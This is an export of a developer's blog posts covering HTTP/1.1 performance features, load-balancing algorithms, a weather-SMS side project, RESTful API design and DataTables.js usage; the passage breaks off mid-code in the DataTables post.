    <content><![CDATA[<p>The Hypertext Transfer Protocol (HTTP) is the foundation of data communication on the web. Although HTTP&#x2F;1.1 has been a standard since 1997, many web developers don’t fully utilize its advanced features for optimized performance. In this post, I’ll explain some key capabilities in HTTP 1.1 and how to leverage them.</p>
<h2 id="HTTP-History"><a href="#HTTP-History" class="headerlink" title="HTTP History"></a>HTTP History</h2><p><img src="/images/2023-10/HTTP-history.png"></p>
<span id="more"></span>

<h2 id="Persistent-Connections"><a href="#Persistent-Connections" class="headerlink" title="Persistent Connections"></a>Persistent Connections</h2><p>Performance issues from Non-persistent connection?</p>
<p>In the early days of HTTP, each request would open a new TCP connection, introduce handshake delays, and accumulate TIME_WAIT sockets after closing.</p>
<p>HTTP 1.1 introduced persistent connections through the Connection header with “keep-alive” value. This allows multiple requests&#x2F;responses to reuse one TCP connection:</p>
<p><img src="/images/2023-10/to-keep-live-connection.png" alt="Connection Keep-Alive Header"></p>
<p>Benefits include:</p>
<ul>
<li>Avoiding TCP handshake overhead</li>
<li>Preventing port exhaustion via too many TIME_WAIT sockets</li>
<li>Enabling request pipelining</li>
</ul>
<p>How to segment messages in a persistent connection?</p>
<h2 id="Request-Pipelining"><a href="#Request-Pipelining" class="headerlink" title="Request Pipelining"></a>Request Pipelining</h2><p>Before HTTP 1.1, each request had to wait for the prior response before being sent. This led to significant delays and underutilization of the TCP connection.</p>
<p>Pipelining allows the client to make multiple requests over a single connection without waiting for each response. This results in much better utilization of available network bandwidth.</p>
<p><img src="/images/2023-10/pipelining.png" alt="HTTP Pipelining"></p>
<h2 id="Chunked-Transfer-Encoding"><a href="#Chunked-Transfer-Encoding" class="headerlink" title="Chunked Transfer Encoding"></a>Chunked Transfer Encoding</h2><p>Calculating the Content-Length header before sending response data introduces delays in first byte delivery. Chunked transfer encoding was introduced to avoid this.</p>
<p>With chunked encoding, the server can begin sending data before knowing the total length. The body is sent in “chunks” with their own length:</p>
<p><img src="/images/2023-10/trailer.png" alt="Chunked Transfer Encoding"></p>
<p>This allows response streaming without a pre-calculated content length.</p>
<h2 id="Powerful-Caching"><a href="#Powerful-Caching" class="headerlink" title="Powerful Caching"></a>Powerful Caching</h2><p>Caching improves performance by reducing redundant requests. HTTP 1.1 has rich caching capabilities through ETags, Cache-Control, and Conditional Requests.</p>
<p>ETags uniquely identify versions of resources. Cache-Control headers tell proxies how to cache responses. Conditional GETs with If-None-Match headers check the ETag to validate caches.</p>
<p>This enables robust caching of both static and dynamically generated content:</p>
<p><img src="/http-caching.png" alt="HTTP Caching"></p>
<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>HTTP 1.1 provides big performance wins over earlier versions through persistent connections, pipelining, chunked transfer encoding, and caching. Modern web developers should understand these features to optimize web and API performance.</p>
<p>Let me know if you would like me to expand or modify anything in this initial draft! I’m happy to revise it based on your feedback.</p>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>Practice</tag>
        <tag>HTTP/1.1</tag>
      </tags>
  </entry>
  <entry>
    <title>常用负载均衡算法</title>
    <url>/experience/practice/dev-load-balancing/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>项目开发时，调用第三方服务集群，集群有多台机器，当机器之间没有主从之分时，需要应用层自己做负载均衡以保证各机器之间的流量均衡。</p>
<h2 id="负载调度算法介绍"><a href="#负载调度算法介绍" class="headerlink" title="负载调度算法介绍"></a>负载调度算法介绍</h2><p>分布式系统中，常用负载调度算法有轮询、加权轮询、哈希、随机、加权随机、最小连接数。</p>
<span id="more"></span>
<ol>
<li><p>轮询法</p>
<p>将请求按顺序轮流地分配到后端服务器上，它均衡地对待后端的每一台服务器，而不关心服务器实际的连接数和当前的系统负载。</p>
</li>
<li><p>随机法</p>
<p>系统的随机算法，根据后端服务器的列表大小值来随机选取其中的一台服务器进行访问。</p>
</li>
<li><p>源地址哈希法</p>
<p>通过客户端 IP 和服务端 IP 生成唯一的 Hash key。</p>
</li>
</ol>
<p>4、加权轮询法</p>
<p>　　不同机器的配置不同，因此所能承受的负载也不同，因此根据机器的性能分配负载权重也不同。</p>
<p>5、加权随机法<br>   和加权轮询类似，后续详解。</p>
<p>6、最小连接数法</p>
<p>​     最小连接数算法比较灵活和智能，由于后端服务器的配置不尽相同，对于请求的处理有快有慢，它是根据后端服务器当前的连接情况，动态地选取其中当前</p>
<p>积压连接数最少的一台服务器来处理当前的请求，尽可能地提高后端服务的利用效率，将负责合理地分流到每一台服务器。</p>
<p>轮询法、随机法和源地址哈希都是比较简单的，本文重点展开加权轮询、加权随机和最小连接数法。</p>
<h3 id="加权轮询"><a href="#加权轮询" class="headerlink" title="加权轮询"></a>加权轮询</h3><p>Nginx 的负载均衡配置中，支持加权轮询，其配置如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">upstream tomcats &#123;</span><br><span class="line">    server 192.168.0.100:8080 weight=2;  # 2/6次</span><br><span class="line">    server 192.168.0.101:8080 weight=3;  # 3/6次</span><br><span class="line">    server 192.168.0.102:8080 weight=1;  # 1/6次</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通常的轮询算法在执行第 $i$ 次请求时，通过 $k &#x3D; (i + 1) % n $ 选举出第$k$台机器，算法简洁、无需记录所有连接状态，是一种很常用的负责均衡算法。其缺点也很明显，就是不能分配各机器的权重，假设有 $n$ 台机器如果宕机 1 台就会导致命中率下降为$1&#x2F;n$，为此加权轮询算法应运而生。</p>
<p>加权轮询 WRR(weighted round-robin)算法分为普通加权轮询和平滑加权轮询。加权轮询核心是将一组机器按照权重扩充得到一个序列，然后和普通的轮询算法一样取模求得当前请求应该访问的机器。比如权重为<code>{a:5, b:1, c:1}</code>的一组服务器，加权轮询算法的扩充序列为<code>{ c, b, a, a, a, a, a } </code>，然而这样的序列导致机器 a 集中分布，会造成某部分服务器集群压力过大。平滑加权轮询算法就是将扩充序列随机打散以保证序列的随机性，如权重为<code>{a:5, b:1, c:1}</code> 的机器的平滑扩充序列可能是 <code>{ a, a, b, a, c, a, a }</code>。</p>
<h3 id="加权随机"><a href="#加权随机" class="headerlink" title="加权随机"></a>加权随机</h3><p>从不重复的含有 n 个元素中不放回随机选取 m 个元素，如果每个元素被选中的概览都相等则把这个过程叫随机抽样（RS——Random Sampling）。加权随机抽样(WRS——Weighted Random Sampling)是指每个元素都带有一个权重，权重决定了该元素被选中的概览。</p>
<p>Pavlos S. Efraimidis 等人在论文<a href="https://utopia.duth.gr/~pefraimi/research/data/2007EncOfAlg.pdf">Weighted Random Sampling</a>中提出了一种 WRS 算法A，以及基于算法 A 的变种 A-Res 和 A-ExpJ。</p>
<ol>
<li>A 算法</li>
</ol>
<ul>
<li>对于集合 $V$ 中的元素 $v_i \in V$，选取均匀分布的随机数 $u_i&#x3D;rand(0,1)$ ，计算元素的特征 $k_i &#x3D; u_i^{(1&#x2F;w_i)}$</li>
<li>将集合按 $k_i$ 排序，选取前 $m$ 大的元素。</li>
</ul>
<p>算法的核心是元素特征 $k_i$ 的计算，其正确性在<a href="http://www.sciencedirect.com/science/article/pii/S002001900500298X"> Weighted random sampling with a reservoir</a>给出了详细的证明。</p>
<ol start="2">
<li><p>A-Res—— 基于 A 算法的改进算法<br>  A-Res(Algorithm A with Reservoir) 是 A 算法的”蓄水池“版本，假设从 $n$ 个元素的集合$V$中按权重选取 $m$ 个元素，该算法维护了 $m$ 个元素的集合 $S$，遍历集合$V$中的元素，计算特征值$k_i &#x3D; u_i^{(1&#x2F;w_i)}$，当当前元素的特征值大于集合$S$中的特征值时，用当前元素替换集合$S$中特征值最小的元素。具体步骤如下：</p>
</li>
<li><p>将集合 $V$ 的前 $m$ 个元素放入结果集合 $S$。</p>
</li>
<li><p>计算集合$S$中每个元素的特征值 $k_i &#x3D; u_i^{(1&#x2F;w_i)}$，其中 $u_i &#x3D; rand(0,1)$</p>
</li>
<li><p>对于$v_i \in {m+1, m+2,….,n}$ 重复如下步骤 4 ~ 6</p>
</li>
<li><p>将结果集中最小的特征 $k_{min}$作为当前的阈值 $T$</p>
</li>
<li><p>对于元素 $v_i$，计算其特征值$k_i &#x3D; u_i^{(1&#x2F;w_i)}$</p>
</li>
<li><p>如果 $k_i &gt; T$ 则使用当前元素$V_i$替换集合$S$中特征值最小的元素(T 所对应的元素)。</p>
</li>
</ol>
<p>  如上步骤，该算法只需对集合 $V$ 遍历一次，且并不需事先知道该集合的长度 $m$，因此该算法非常适合数据流场景。论文证明了该算法插入$S$的次数为$O(m \log(\frac{n}{m}))$。该算法实现也不难，核心是维护一个最小堆。</p>
<h3 id="最小连接数法"><a href="#最小连接数法" class="headerlink" title="最小连接数法"></a>最小连接数法</h3><p>在实际生产中，客户端的每一次请求并非是相同的请求，服务端处理的时间也不相同，因此无论使用源地址哈希还是随机亦或是轮询都只是即用户请求数量层面的负载均衡。最小连接数法是记录了各服务器的当前连接数量，新请求来时将请求分配到当前连接数最少的服务器。其他负载均衡算法中，当宕机时失败率会瞬间增加，需要手动将机器摘除或将该机器的权重置为0 ，而最小连接法是一种动态调度算法，当发生宕机时，甚至可以实现自动切流量，提高成功率。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><p><a href="https://colobu.com/2016/12/04/smooth-weighted-round-robin-algorithm/">https://colobu.com/2016/12/04/smooth-weighted-round-robin-algorithm/</a></p>
</li>
<li><p><a href="https://utopia.duth.gr/~pefraimi/research/data/2007EncOfAlg.pdf">https://utopia.duth.gr/~pefraimi/research/data/2007EncOfAlg.pdf</a></p>
</li>
<li><p><a href="https://lotabout.me/2018/Weighted-Random-Sampling/">https://lotabout.me/2018/Weighted-Random-Sampling/</a></p>
</li>
<li><p><a href="http://security.ctocio.com.cn/securitycomment/412/8082412.shtml">http://security.ctocio.com.cn/securitycomment/412/8082412.shtml</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>Balancing</tag>
      </tags>
  </entry>
  <entry>
    <title>定时发送天气预报</title>
    <url>/experience/practice/dev-send-weather-forecast-timely/</url>
    <content><![CDATA[<p>手机端的天气预报应用有很多，但总是差强人意，一方面不想下载天气预报应用，另一方面各种应用参差不齐，往往对天气的预报有偏差，又或者是根本不想抽时间去关注今天的天气情况…编不下去了，不管怎样，程序员总是要折腾，于是抽了点时间写了个定时发送天气预报的应用程序。实现思路很简单，就是调一些 API，大概流程如下：</p>
<span id="more"></span>

<ol>
<li><p>配置地址、电话信息</p>
</li>
<li><p><a href="http://lbsyun.baidu.com/index.php?title=webapi/guide/webservice-geocoding">百度经纬度 API</a></p>
</li>
<li><p><a href="https://www.seniverse.com/doc">天气接口</a></p>
</li>
<li><p><a href="https://dayu.aliyun.com/">发送短信接口</a></p>
</li>
<li><p>部署到线上环境定时执行</p>
</li>
</ol>
<h2 id="地址信息"><a href="#地址信息" class="headerlink" title="地址信息"></a>地址信息</h2><p>本来是想通过手机动态定位，但经过多种尝试都没能成功，尝试过的方案如下：</p>
<ul>
<li><p>通过MAC 地址获取失败</p>
</li>
<li><p>通过 IMEI 获取失败</p>
</li>
<li><p>通过 IP 无法得到 IP 失败</p>
</li>
</ul>
<p>所以只能先手动配置有待以后慢慢探索，但希望配置能更精确，而不是一个广泛的概念，比如配置为“辽宁省大连市甘井子区大连海事大学”。天气预报接口跨域根据输入的城市或地区定位，但位置信息太精确可能获取不到，比如输入天气接口能获取到“大连”的天气信息，但不一定能获取到“甘井子区”的天气信息。好在有些天气预报支持经纬度查询，因此将详细地址转化为经纬度后通过经纬度可以获取到最小范围的天气信息，因此我们使用百度地图的 API。</p>
<h2 id="百度地图-webservice-geocoding-API"><a href="#百度地图-webservice-geocoding-API" class="headerlink" title="百度地图 webservice-geocoding API"></a><a href="http://lbsyun.baidu.com/index.php?title=webapi/guide/webservice-geocoding">百度地图 webservice-geocoding API</a></h2><h2 id="天气接口"><a href="#天气接口" class="headerlink" title="天气接口"></a>天气接口</h2><ul>
<li><p>最终选择心知天气，选择经纬度定位确保获取成功</p>
</li>
<li><p>生活指数</p>
</li>
</ul>
<h2 id="短信接口"><a href="#短信接口" class="headerlink" title="短信接口"></a>短信接口</h2><pre><code>- 使用阿里大于：申请复杂，模板固定

- 使用 139 或 189 邮箱，开通结尾太丑

继续尝试其他方案

- 短信宝，终于找到一个注册后就可以使用的
</code></pre>
<p>[未完待续…]</p>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>API</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>RESTful API 设计指导</title>
    <url>/experience/practice/dev-restful-api-design/</url>
    <content><![CDATA[<h2 id="1-RESTful-简介"><a href="#1-RESTful-简介" class="headerlink" title="1. RESTful 简介"></a>1. RESTful 简介</h2><p>REST (Representational State Transfer) 翻作「表层状态转换」，是 Roy Thomas Fielding 在他的博士论文中提出的一种 API 设计风格。</p>
<blockquote>
<p>表现层状态转换是根基于超文本传输协议(HTTP)之上而确定的一组约束和属性，是一种设计提供万维网络服务的软件构建风格。匹配或兼容于这种架构风格(简称为 REST 或 RESTful)的网络服务，允许客户端发出以统一资源标识符访问和操作网络资源的请求，而与预先定义好的无状态操作集一致化。因此表现层状态转换提供了在互联网络的计算系统之间，彼此资源可交互使用的协作性质(interoperability)。<br> —— wikipedia</p>
</blockquote>
<span id="more"></span>
<p>当今互联网无处不在，现实需求日益复杂，为适应这种复杂性，技术不断革新。传统的 B&#x2F;S 架构中，前后端分离是大势所趋，而这种分离正式基于 API 模型，由于 RESTful 的诸多便利，越来越多的公司开始拥抱 RESTful，如 Github、Google 等都大量使用这种风格的 API，掌握 RESTful API 成为了一个后端程序员必备的基本技能。</p>
<h2 id="2-API-设计"><a href="#2-API-设计" class="headerlink" title="2. API 设计"></a>2. API 设计</h2><p>RESTful API 是基于 HTTP 之上的一种设计风格，按照 HTTP 请求的基本组成将 RESTful API 分为如下几个模块：</p>
<p><img src="/images/2019-02/restful-api-structure.png"> </p>
<h3 id="2-1-协议"><a href="#2-1-协议" class="headerlink" title="2.1 协议"></a>2.1 协议</h3><p>为保证数据的传输安全，推荐使用 HTTPS 协议</p>
<h3 id="2-2-域名与版本"><a href="#2-2-域名与版本" class="headerlink" title="2.2 域名与版本"></a>2.2 域名与版本</h3><p>API 域名有两种形式可选择： </p>
<ul>
<li>使用专属域名 <a href="">api.example.com</a></li>
<li>主站域名+<code>/api</code> 形式, 如 <a href="">example.com&#x2F;api</a></li>
</ul>
<p>API 版本通常页有两种形式</p>
<ul>
<li>域名 + <code>v1/</code> 如 <a href="">api.example.com&#x2F;v1</a></li>
<li>版本信息放在 HTTP header 中，参见 <a href="https://developer.github.com/v3/media/#request-specific-version">GitHub</a></li>
</ul>
<h3 id="2-3-资源操作"><a href="#2-3-资源操作" class="headerlink" title="2.3 资源操作"></a>2.3 资源操作</h3><p>使用 HTTP 方法表示资源的操作</p>
<table>
<thead>
<tr>
<th align="center">HTTP 方法</th>
<th align="center">对应数据库操作</th>
<th align="center">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">GET</td>
<td align="center">SELECT</td>
<td align="center">获取 URI 表示的资源（retrive），不产生副作用，对资源属性没有改变</td>
</tr>
<tr>
<td align="center">POST</td>
<td align="center">INSERT</td>
<td align="center">创建资源</td>
</tr>
<tr>
<td align="center">PUT</td>
<td align="center">UPDATE</td>
<td align="center">更新资源，客户端提供完整资源</td>
</tr>
<tr>
<td align="center">PATCH</td>
<td align="center">UPDATE</td>
<td align="center">更新资源的部分属性，客户端只提供更新的部分属性</td>
</tr>
<tr>
<td align="center">DELETE</td>
<td align="center">DELETE</td>
<td align="center">删除 URI 定位到的资源</td>
</tr>
</tbody></table>
<h3 id="2-4-资源路径——URL"><a href="#2-4-资源路径——URL" class="headerlink" title="2.4 资源路径——URL"></a>2.4 资源路径——URL</h3><p>资源路径的设计是 RESTful API 的核心，资源是 HTTP 协议对数据的抽象，一个资源可简单理解为数据库中的一张表。URL （统一资源定位符）是用于标识资源的字符串，资源如果可数则使用名词复数表示，否则使用单数表示，以用户<code>users</code>为例，</p>
<ul>
<li><p>获取用户列表</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET /users</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取具体用户 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /users/:user_id</span><br></pre></td></tr></table></figure>

<p>如 <a href="">&#x2F;users&#x2F;1</a> 表示获取用户 id 为 1 的用户</p>
</li>
<li><p>新增用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /users</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PUT /users/:user_id</span><br></pre></td></tr></table></figure>

<p>客户端（表单）应提供完整的用户信息</p>
</li>
<li><p>修改用户的部分属性</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATCH /users/:user_id</span><br></pre></td></tr></table></figure>

<p>客户端提供要修改的用户属性</p>
</li>
<li><p>删除用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELETE /users/:user_id</span><br></pre></td></tr></table></figure></li>
</ul>
<p>以上只是最基本的 URI 设计原则，但是在实际工程中，多个资源之间会存在关联关系，如在经典的博客系统中，存在「用户—文章—评论」存在如下关联关系：</p>
<ul>
<li>一篇文章必定有一个或多个作者</li>
<li>一个评论必定属于具体的一篇文章</li>
</ul>
<p>用如下方式可表示「查看某个用户发布的文章」：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET /users/<span class="number">1</span>/articles 	<span class="comment"># 查看 user_id 为 1 的文章</span></span><br></pre></td></tr></table></figure>



<h3 id="2-5-URL-参数"><a href="#2-5-URL-参数" class="headerlink" title="2.5 URL 参数"></a>2.5 URL 参数</h3><p>URL 参数应该只是对资源的过滤，不应该有其他作用，一般可用于分页、排序和筛选</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?limit=10：指定返回记录的数量</span><br><span class="line">?offset=10：指定返回记录的开始位置。</span><br><span class="line">?page=2&amp;per_page=100：指定第几页，以及每页的记录数。</span><br><span class="line">?sortby=name&amp;order=asc：指定返回结果按照哪个属性排序，以及排序顺序。</span><br><span class="line">?animal_type_id=1：指定筛选条件</span><br></pre></td></tr></table></figure>



<h3 id="2-6-HTTP-请求头"><a href="#2-6-HTTP-请求头" class="headerlink" title="2.6 HTTP 请求头"></a>2.6 HTTP 请求头</h3><p>HTTP 请求头可以携带附加信息，如版本号、响应格式和 Token 等。</p>
<h3 id="2-7-HTTP-状态码"><a href="#2-7-HTTP-状态码" class="headerlink" title="2.7 HTTP 状态码"></a>2.7 HTTP 状态码</h3><p>HTTP 状态码是由三位整数组成的，分为 5 大系列</p>
<ul>
<li><p>1xx : 请求已被接受，等待进一步处理，一般不常用。</p>
<p>在使用 websocket 的时候从 websocket 协议升级到 socket.io 协议时返回 101，表示转换协议。</p>
</li>
<li><p>2xx: 请求成功</p>
</li>
<li><p>3xx: 重定向</p>
</li>
<li><p>4xx: 客户端错误</p>
</li>
<li><p>5xx: 服务端异常</p>
</li>
</ul>
<p>详细的 HTTP 状态码可参考<a href="https://zh.wikipedia.org/wiki/HTTP%E7%8A%B6%E6%80%81%E7%A0%81">维基百科</a>  或 <a href="https://tools.ietf.org/html/rfc2616#section-10">RFC2616</a></p>
<h2 id="3-不符合-CURD-的操作"><a href="#3-不符合-CURD-的操作" class="headerlink" title="3. 不符合 CURD 的操作"></a>3. 不符合 CURD 的操作</h2><p>在实际生产中，并非所有的 HTTP 请求都符合资源的 CURD 操作，不符合常规资源 CURD 操作的请求一般有如下三种处理方法：</p>
<ul>
<li><p>增加动作，并使用 POST 方法执行动作</p>
<p>如文章发布 <code>POST /articles/:id/publish</code></p>
</li>
<li><p>增加控制参数</p>
<p>发布文章使用 PATCH 更改文章的 published 属性 <code>PATCH /articles/:id?published=true</code></p>
</li>
<li><p>把动作转化为资源</p>
<p>GitHub 把「喜欢」这个动作转化为一个资源 star，因为喜欢是不可数的，所以使用单数表示，比如“喜欢”一个 gist，使用 <code>PUT /gists/:id/star</code>，“取消喜欢”使用 <code>DELETE /gists/:id/star</code>。</p>
</li>
</ul>
<h2 id="4-REST-的优点"><a href="#4-REST-的优点" class="headerlink" title="4. REST 的优点"></a>4. REST 的优点</h2><ul>
<li>可更高效利用 HTTP 缓存来提高响应速度</li>
<li>通讯本身的无状态性可以让不同的服务器的处理一系列请求中的不同请求，提高服务器的扩展性</li>
<li>浏览器即可作为客户端，简化软件需求</li>
<li>相对于其他叠加在HTTP协议之上的机制，REST的软件依赖性更小</li>
<li>不需要额外的资源发现机制</li>
<li>在软件技术演进中的长期的兼容性更好</li>
</ul>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>API</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>DataTable.js 使用笔记</title>
    <url>/experience/practice/frontend-datatable-js-example/</url>
    <content><![CDATA[<blockquote>
<p>Datatables是一款jquery表格插件。它是一个高度灵活的工具，可以将任何HTML表格添加高级的交互功能。</p>
</blockquote>
<p>Datatables 灵活易用，具有如下特性：</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 自动分页</li>
<li><input checked="" disabled="" type="checkbox"> 即时搜索</li>
<li><input checked="" disabled="" type="checkbox"> 多种排序规则，可自定义任意列排序，也可以多列排序</li>
<li><input checked="" disabled="" type="checkbox"> 可对分页样式、搜索框等自定义 CSS</li>
<li><input checked="" disabled="" type="checkbox"> 国际化，支持多种语言</li>
</ul>
<p>……</p>
<span id="more"></span>

<h2 id="一、如何使用"><a href="#一、如何使用" class="headerlink" title="一、如何使用"></a>一、如何使用</h2><h3 id="实例化"><a href="#实例化" class="headerlink" title="实例化"></a>实例化</h3><p>Datatable 的初始化很简单，引入<code>jquery.dataTables.css </code>、 <code>jquery.dataTables.js</code> 和 <code>jquery.js</code> 后使用</p>
<p><code>$(&lt;selector&gt;).DataTable()</code>  实例化一个表格，完整案例如下，</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--引入css--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn.datatables.net/1.10.15/css/jquery.dataTables.min.css&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--引入JavaScript--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">language</span>=<span class="string">&quot;javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;//code.jquery.com/jquery-1.12.4.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">language</span>=<span class="string">&quot;javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.datatables.net/1.10.15/js/jquery.dataTables.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--定义DOM--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">id</span>=<span class="string">&quot;example&quot;</span> <span class="attr">class</span>=<span class="string">&quot;display&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:100%&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--初始化代码--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">     $(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">           <span class="keyword">let</span> exampleTable = $(<span class="string">&#x27;#example&#x27;</span>).<span class="title class_">DataTable</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>值得注意的在 1.10.x 之前是使用 <code>let exampleTable = $(&#39;#example&#39;).dataTable();</code> 初始化，dataTable 是一个jQuery 对象，1.10.x 后虽然也对该对象做了兼容但不建议使用，具体的差别可以参见 <a href="https://stackoverflow.com/questions/25207147/datatable-vs-datatable-why-is-there-a-difference-and-how-do-i-make-them-w">here</a>。</p>
<h3 id="四种数据源"><a href="#四种数据源" class="headerlink" title="四种数据源"></a>四种数据源</h3><p>DataTable 的数据源一般可以从如下四种渠道中获得，</p>
<ol>
<li><p>如果表格中已经有数据则 DataTable 的数据源从 DOM 中获取，这是最简单的获取数据的方式；</p>
</li>
<li><p>可以从 JavaScript 数组或对象中获得，如下案例，</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> dataSet = [</span><br><span class="line">    [<span class="string">&#x27;Trident&#x27;</span>,<span class="string">&#x27;Internet Explorer 4.0&#x27;</span>,<span class="string">&#x27;Win 95+&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;X&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;Trident&#x27;</span>,<span class="string">&#x27;Internet Explorer 5.0&#x27;</span>,<span class="string">&#x27;Win 95+&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;C&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;Gecko&#x27;</span>,<span class="string">&#x27;Firefox 1.0&#x27;</span>,<span class="string">&#x27;Win 98+ / OSX.2+&#x27;</span>,<span class="string">&#x27;1.7&#x27;</span>,<span class="string">&#x27;A&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;Gecko&#x27;</span>,<span class="string">&#x27;Firefox 1.5&#x27;</span>,<span class="string">&#x27;Win 98+ / OSX.2+&#x27;</span>,<span class="string">&#x27;1.8&#x27;</span>,<span class="string">&#x27;A&#x27;</span>],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $(<span class="string">&#x27;#demo&#x27;</span>).<span class="title function_">html</span>( <span class="string">&#x27;&lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot; class=&quot;display&quot; id=&quot;example&quot;&gt;&lt;/table&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    $(<span class="string">&#x27;#example&#x27;</span>).<span class="title function_">dataTable</span>( &#123;</span><br><span class="line">        <span class="string">&quot;data&quot;</span>: dataSet,</span><br><span class="line">        <span class="string">&quot;columns&quot;</span>: [</span><br><span class="line">            &#123; <span class="string">&quot;title&quot;</span>: <span class="string">&quot;Engine&quot;</span> &#125;,</span><br><span class="line">            &#123; <span class="string">&quot;title&quot;</span>: <span class="string">&quot;Browser&quot;</span> &#125;,</span><br><span class="line">            &#123; <span class="string">&quot;title&quot;</span>: <span class="string">&quot;Platform&quot;</span> &#125;,</span><br><span class="line">            &#123; <span class="string">&quot;title&quot;</span>: <span class="string">&quot;Version&quot;</span>, <span class="string">&quot;class&quot;</span>: <span class="string">&quot;center&quot;</span> &#125;,</span><br><span class="line">            &#123; <span class="string">&quot;title&quot;</span>: <span class="string">&quot;Grade&quot;</span>, <span class="string">&quot;class&quot;</span>: <span class="string">&quot;center&quot;</span> &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125; );</span><br><span class="line">&#125; );</span><br></pre></td></tr></table></figure>

<p> 从 JavaScript 数组中获取是通过配置选项中的 <code>data</code> 参数指定，同时需要用 <code>columns</code> 指定表头。</p>
</li>
<li><p>通过 AJAX 获得，</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $(<span class="string">&#x27;#example&#x27;</span>).<span class="title class_">DataTable</span>( &#123;</span><br><span class="line">        <span class="string">&quot;ajax&quot;</span>: <span class="string">&#x27;path/to/dataList.txt&#x27;</span></span><br><span class="line">    &#125; );</span><br><span class="line">&#125; );</span><br></pre></td></tr></table></figure>

<p> 其中 dataList.txt 是一个如下格式 JSON 对象，</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: [</span><br><span class="line">        [</span><br><span class="line">            <span class="string">&quot;Tiger Nixon&quot;</span>,</span><br><span class="line">            <span class="string">&quot;System Architect&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Edinburgh&quot;</span>,</span><br><span class="line">            <span class="string">&quot;5421&quot;</span>,</span><br><span class="line">            <span class="string">&quot;2011/04/25&quot;</span>,</span><br><span class="line">            <span class="string">&quot;$320,800&quot;</span></span><br><span class="line">        ],</span><br><span class="line">        [</span><br><span class="line">            <span class="string">&quot;Garrett Winters&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Accountant&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Tokyo&quot;</span>,</span><br><span class="line">            <span class="string">&quot;8422&quot;</span>,</span><br><span class="line">            <span 